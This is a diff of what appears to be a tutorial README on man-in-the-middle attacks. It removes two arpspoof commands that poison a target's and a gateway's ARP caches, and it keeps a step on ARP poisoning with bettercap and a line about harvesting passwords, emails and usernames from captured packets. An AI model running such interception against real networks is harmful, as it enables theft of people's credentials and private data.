@@ -100,15 +100,5 @@ https://user-images.githubusercontent.com/64968597/134026257-af761b17-4b0b-4c87-
 
 ![https_bypass_blur](https://user-images.githubusercontent.com/64968597/134031635-1eb1f336-2dc0-4400-8f64-566ddcf44f2f.png)
 
-1. ARP poisoning with arpspoof:
-   <br/> Spoofing the target and telling him we are the router:
-   ```
-   arpspoof -i wlan0 -t target_ip_addr ip_addr_gateway
-   ```   
-   <br/> Spoofing the router and telling him we are the target:
-   ```
-   arpspoof -i wlan0 -t ip_addr_gateway target_ip_addr 
-   ```
-
-2. Bypass https using bettercap:
+1. ARP poisoning using bettercap:
    <br/> The captured packets are easily analysed using Wireshark to gather passwords, emails, usernames, etc.
